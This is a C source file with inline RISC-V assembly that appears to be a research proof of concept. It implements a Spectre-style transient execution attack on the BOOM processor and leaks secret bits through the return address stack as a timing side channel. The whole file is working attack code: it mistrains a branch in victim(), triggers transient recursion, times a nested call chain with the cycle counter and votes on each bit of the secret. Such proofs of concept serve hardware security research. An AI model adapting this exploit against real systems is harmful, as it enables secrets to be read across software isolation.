/* Transient execution attack using RAS on risc-v BOOM
 *
 * Boom transiently updates RAS, thus RAS can be used as a timing side channel
 * for transient execution attack on Boom.
 *
 * Attack type: Spectre (Supervisor -> Supervisor)
 * Secret access: Over software isolation
 * Side channel: RAS
 */

#include <stdio.h>
#include <stdint.h>
#include "util.h"
#include "encoding.h"

extern uint8_t secret[];
uint8_t benign[] = "absolute";

#define S_WORD 32

void victim(uint64_t mustbe0, uint64_t idx) __attribute__((section(".text.attack")));
/* void infinite(uint64_t i) __attribute__((section(".text.attack"))); */
void infinite() __attribute__((section(".text.attack")));

uint64_t nested(uint64_t i, uint64_t idx) __attribute__((section(".text.attack")));
int main(void) __attribute__((section(".text.attack")));

void victim(uint64_t mustbe0, uint64_t idx) {
    volatile uint64_t s = (uint64_t) (*(uint64_t *) secret);
    volatile uint64_t tobe1 = 16, two = 2;

    volatile uint64_t v = ((((-mustbe0) & s) >> idx) & 1);
    asm("fence\n"
        "fcvt.s.lu    fa4, %[in]\n"
        "fcvt.s.lu    fa5, %[inout]\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.lu.s    %[out], fa5, rtz\n"
        : [out]"=r"(tobe1)
        : [inout]"r"(tobe1), [in]"r"(two)
        : "fa4", "fa5");

    if (mustbe0 < tobe1) {
        if (v == 1) {
            infinite();
        }
    } else {
        return;
    }

    return;
}

void infinite() {
    infinite();
    /* if (i == 0) */
    /*     return; */
    /* i--; */

    /* infinite(i); */
    /* return; */
}

uint64_t nested(uint64_t i, uint64_t idx) {
    uint64_t cycle;

    if (i == 0) {
        victim(1, idx);

        asm volatile("csrr %0, cycle"
                     : "=r"(cycle));
        return cycle;
    }
    i--;

    cycle = nested(i, idx);
    return cycle;
}

int main(void) {
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0, };
    uint8_t votes[S_WORD] = {0, };

    uint64_t start, end;

    printf("[*] RAS exploit on BOOM\n");

    for (int idx = S_WORD - 1; idx >= 0; idx--) {
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {

            /* Poison branch in victim */
            for (int i = 0; i < 5; i++)
                victim(0, 0);

            start = nested(64, idx);
            asm volatile("csrr %0, cycle"
                         : "=r"(end));
            cycles[t] = end - start;
            printf("%4ld ", cycles[t]);
        }

        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
            if (cycles[t] > 560)
                sum++;
        }

        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum: TRIAL - sum;

        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    }

    // printf("[*] Secret: 0x");
    // for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
    //     uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
    //     printf("%x", hex);
    // }
    // printf("\n");

    uint8_t *stopsig_addr = 0x60000000;
    uint8_t *regdump_addr = 0x60000010;
    uint8_t test = 0;
    *regdump_addr = test;
    asm volatile("fence\n");
    *stopsig_addr = 0x0;

    return 0;
}
